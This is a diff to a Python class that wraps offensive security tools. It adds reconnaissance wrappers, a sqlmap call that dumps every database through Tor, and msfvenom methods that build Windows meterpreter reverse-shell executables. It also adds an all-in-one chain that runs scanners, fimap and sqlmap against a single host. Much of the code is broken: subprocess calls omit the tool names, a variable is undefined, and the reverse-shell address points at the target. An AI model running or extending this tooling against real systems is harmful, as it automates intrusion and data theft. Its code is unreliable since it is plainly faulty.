@@ -67,6 +67,25 @@ class Wrappers:
         self.sublist3r = "sublist3r"
         self.joomscan = "joomscan"
         self.nikto = "nikto"
+        self.httprobe = "httprobe"
+        self.httprobe_headers = "httprobe -H"
+        self.httprobe_all = "httprobe -a"
+        self.httprobe_all_headers = "httprobe -a -H"
+        self.dnsrecon_domains = "dnsrecon -d"
+        self.dnsrecon_subs = "dnsrecon -s"
+        self.dnsrecon_brute = "dnsrecon -b"
+        self.dnsrecon_all = "dnsrecon -a"
+        self.dnsrecon_all_brute = "dnsrecon -a -b"
+        self.dnsrecon_all_subs = "dnsrecon -a -s"
+
+        self.metasploit = metasploit
+        self.msfconsole = "msfconsole"
+        self.msfvenom = "msfvenom"
+        self.msfpg = "msfpg"
+        self.msfpg_list = "msfpg -l"
+        self.msfpg_list_all = "msfpg -l -a"
+
+
     
         self.nuclei_templates = nuclei_templates
         self.nuclei_modules = nuclei_modules
@@ -201,7 +220,7 @@ class Wrappers:
 
     def sqlmap(self, host):
         self.host_set(host)
-        self.sqlmap_options = '-u ' + self.url + ' --batch --random-agent --threads 10 --level 3 --risk 3 --timeout 10 --smart --dbs --tamper=url --dbs --dbms=mysql --dbms=mssql --dbms=oracle --dbms=postgres --dbms=sqlite --dbms=sqlserver --dbs --tables --columns --forms --dump --dbs --sql-query --tor --tor-type=socks5 --tor-port=9050 --tor-control-port=9051 --tor-control-addr=
+        self.sqlmap_options = '-u ' + self.url + " --batch --random-agent --threads 10 --level 3 --risk 3 --timeout 10 --smart --dbs --tamper=url --dbs --dbms=mysql --dbms=mssql --dbms=oracle --dbms=postgres --dbms=sqlite --dbms=sqlserver --dbs --tables --columns --forms --dump --dbs --sql-query --tor --tor-type=socks5 --tor-port=9050 --tor-control-port=9051"
         self.sqlmap_output = subprocess.check_output(self.sqlmap_options, shell=False)
 
     def fimap(self, host):
@@ -289,5 +308,90 @@ class Wrappers:
         self.sublist3r_options = '-d ' + self.host + ' -o ' + self.host + '_sublist3r.txt'
         self.sublist3r_output = subprocess.check_output(self.sublist3r_options, shell=False)
 
+    def dnsrecon(self, host):
+        self.host_set(host)
+        self.dnsrecon_options = '-d ' + self.host + ' -o ' + self.host + '_dnsrecon.txt'
+        self.dnsrecon_output = subprocess.check_output(self.dnsrecon_options, shell=False)
+
+    def nikto(self, host):
+        self.host_set(host)
+        self.nikto_options = '-host ' + self.host + ' -Format htm -output ' + self.host + '_nikto.txt'
+        self.nikto_output = subprocess.check_output(self.nikto_options, shell=False)
+
+    def nmap(self, host):
+        self.host_set(host)
+        self.nmap_options = '-sV -Pn -p- -oN ' + self.host + '_nmap.txt ' + self.host
+        self.nmap_output = subprocess.check_output(self.nmap_options, shell=False)
+
+    def httprobe(self, host):
+        self.host_set(host)
+        self.httprobe_options = '-c -t 100 -p ' + self.host + '_httprobe.txt ' + self.host
+        self.httprobe_output = subprocess.check_output(self.httprobe_options, shell=False)
+
+    def massdns(self, host):
+        self.host_set(host)
+        self.massdns_options = '-r ' + self.massdns_db_big_ext + ' -r ' + self.massdns_db_big_all + ' -r ' + self.massdns_db_big_all_ext + ' -r ' + self.massdns_db_small_ext + ' -r ' + self.massdns_db_small_all + ' -r ' + self.massdns_db_small_all_ext + ' -t A -o S -w ' + self.host + '_massdns.txt ' + self.host
+        self.massdns_output = subprocess.check_output(self.massdns_options, shell=False) 
+
+    def massdns_big(self, host):
+        self.host_set(host)
+        self.massdns_options = '-r ' + self.massdns_db_big_ext + ' -r ' + self.massdns_db_big_all + ' -r ' + self.massdns_db_big_all_ext + ' -t A -o S -w ' + self.host + '_massdns.txt ' + self.host
+        self.massdns_output = subprocess.check_output(self.massdns_options, shell=False)
+
+    def massdns_small(self, host):
+        self.host_set(host)
+        self.massdns_options = '-r ' + self.massdns_db_small_ext + ' -r ' + self.massdns_db_small_all + ' -r ' + self.massdns_db_small_all_ext + ' -t A -o S -w ' + self.host + '_massdns.txt ' + self.host
+        self.massdns_output = subprocess.check_output(self.massdns_options, shell=False)
     
-        
+    def massdns_big_ext(self, host):
+        self.host_set(host)
+        self.massdns_options = '-r ' + self.massdns_db_big_ext + ' -t A -o S -w ' + self.host + '_massdns.txt ' + self.host
+        self.massdns_output = subprocess.check_output(self.massdns_options, shell=False)
+    
+    def massdns_big_all(self, host):
+        self.host_set(host)
+        self.massdns_options = '-r ' + self.massdns_db_big_all + ' -t A -o S -w ' + self.host + '_massdns.txt ' + self.host
+        self.massdns_output = subprocess.check_output(self.massdns_options, shell=False)
+
+#start_metasploit
+#================
+    def msf_venom(self, host):
+        self.host_set(host)
+        self.msf_venom_options = '-p windows/meterpreter/reverse_tcp LHOST=' + self.host + ' LPORT=4444 -f exe -o ' + self.host + '_msf_venom.exe'
+        self.msf_venom_output = subprocess.check_output(self.msf_venom_options, shell=False)
+    
+    def msf_listener(self, host):
+        self.host_set(host)
+        self.msf_listener_options = '-p windows/meterpreter/reverse_tcp LHOST=' + self.host + ' LPORT=4444 -f exe -o ' + self.host + '_msf_listener.exe'
+        self.msf_listener_output = subprocess.check_output(self.msf_listener_options, shell=False)
+
+    def msf_payload(self, host):
+        self.host_set(host)
+        self.msf_payload_options = '-p windows/meterpreter/reverse_tcp LHOST=' + self.host + ' LPORT=4444 -f exe -o ' + self.host + '_msf_payload.exe'
+        self.msf_payload_output = subprocess.check_output(self.msf_payload_options, shell=False)
+    
+    def msf_payload_listener(self, host):
+        self.host_set(host)
+        self.msf_payload_listener_options = '-p windows/meterpreter/reverse_tcp LHOST=' + self.host + ' LPORT=4444 -f exe -o ' + self.host + '_msf_payload_listener.exe'
+        self.msf_payload_listener_output = subprocess.check_output(self.msf_payload_listener_options, shell=False)
+#================
+    
+#OVERKILL XD
+
+    def recon_all(self, host):
+        self.httprobe(host)
+        self.massdns(host)
+        self.nmap(host)
+        self.sublist3r(host)
+        self.dnsrecon(host)
+        self.amass(host)
+        self.theharvester(host)
+        self.waybackurls(host)
+        self.subfinder(host)
+        self.nuclei(host)
+        self.nikto(host)
+        self.amass(host)
+        self.fimap(host)
+        self.sqlmap(host)
+        self.dirb(host)
+#-------------------------
